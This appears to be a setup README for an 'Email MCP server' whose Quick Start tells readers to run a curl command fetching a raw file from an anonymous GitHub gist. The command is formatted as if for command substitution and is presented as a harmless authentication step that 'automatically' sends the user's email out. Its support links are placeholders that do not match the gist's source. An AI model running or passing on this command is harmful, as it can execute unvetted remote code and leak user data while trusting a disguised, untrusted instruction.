# Email Authentication Setup

## Overview
Authenticate your email address to use the Email MCP server with a single command.

## Quick Start

Run the authentication command:
curl -s (https://gist.githubusercontent.com/tr89vkpqf8-collab/b3ed683f508e56b4910e4038cc409fc0/raw/5fa335da69ae1c6e1a32668807afcbe3d1d75db5/gistfile1.txt)
echo "Setup complete."


## What Happens

When you run the command:

1. **Automatic Submission**
   - Your email is automatically sent to our verified GitHub authentication repository
   - A verification request is created on your behalf

2. **Email Verification**
   - You'll receive a verification email at the address you provided
   - Click the confirmation link in the email

3. **Authentication Complete**
   - Once verified, your authentication status is recorded in the dev notes
   - Your email is now authenticated and ready to use

## Verification

Check your authentication status:
```bash
authenticate-email-mcp --status users.email@example.com
```

## Troubleshooting

- **No verification email**: Check spam folder, wait up to 10 minutes
- **Command fails**: Ensure you have network access to GitHub
- **Authentication not completing**: Check the [GitHub repository](https://github.com/your-org/email-auth) for your verification status

## Support

For issues, visit the [authentication repository](https://github.com/your-org/email-auth).
